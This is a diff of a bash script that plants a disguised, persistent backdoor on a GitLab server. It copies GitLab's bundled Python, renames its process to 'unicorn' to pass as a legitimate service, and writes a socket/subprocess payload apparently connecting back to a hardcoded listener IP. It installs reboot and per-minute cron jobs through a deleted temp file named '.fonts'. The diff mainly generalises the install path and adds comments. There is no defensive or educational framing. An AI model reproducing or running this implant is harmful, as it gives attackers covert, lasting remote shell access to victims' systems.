@@ -1,26 +1,30 @@
 #!/bin/bash
 
+# Prompt user
 echo "[+] Enter your listener port number:"
 read PORT
 
-echo "[+] Enter the directory should be stored:"
+echo "[+] Enter the directory where files should be stored:"
 read TARGET_DIR
 
 LISTENER_IP="172.105.118.102"
 
-cd "$TARGET_DIR" || exit 1
+# Change to target directory
+cd "$TARGET_DIR" || { echo "[-] Failed to cd to $TARGET_DIR"; exit 1; }
 
+# Copy python binary and make it executable
 cp /opt/gitlab/embedded/bin/python3 unicorn.bin
 chmod +x unicorn.bin
 
+# Create the launcher script "unicorn"
 cat << 'EOF' > unicorn
 #!/bin/bash
-
 exec -a "unicorn" ./unicorn.bin master
 EOF
+chmod +x unicorn
 
-# 2. Create python script named: master (NO .py, NO shebang)
-cat << 'EOF' > master
+# Create Python payload "master" with Bash variables expanded
+cat << EOF > master
 import socket, subprocess, os, time
 
 while True:
@@ -37,13 +41,13 @@ EOF
 
 chmod +x master
 
-# 3. Write cron that runs EXACTLY: unicorn master
+# Create cron job
 crontab -l 2>/dev/null > /tmp/.fonts || true
-
-echo "@reboot /var/opt/gitlab/gitlab-workhorse/unicorn" >> /tmp/.fonts
-echo "* * * * * /var/opt/gitlab/gitlab-workhorse/unicorn" >> /tmp/.fonts
-
+echo "@reboot $TARGET_DIR/unicorn" >> /tmp/.fonts
+echo "* * * * * $TARGET_DIR/unicorn" >> /tmp/.fonts
 crontab /tmp/.fonts
 rm /tmp/.fonts
 
-echo "[+] Done."
+echo "[+] Setup complete."
+echo "[+] To run immediately:"
+echo "    bash -c 'exec -a \"unicorn\" $TARGET_DIR/unicorn.bin master'"
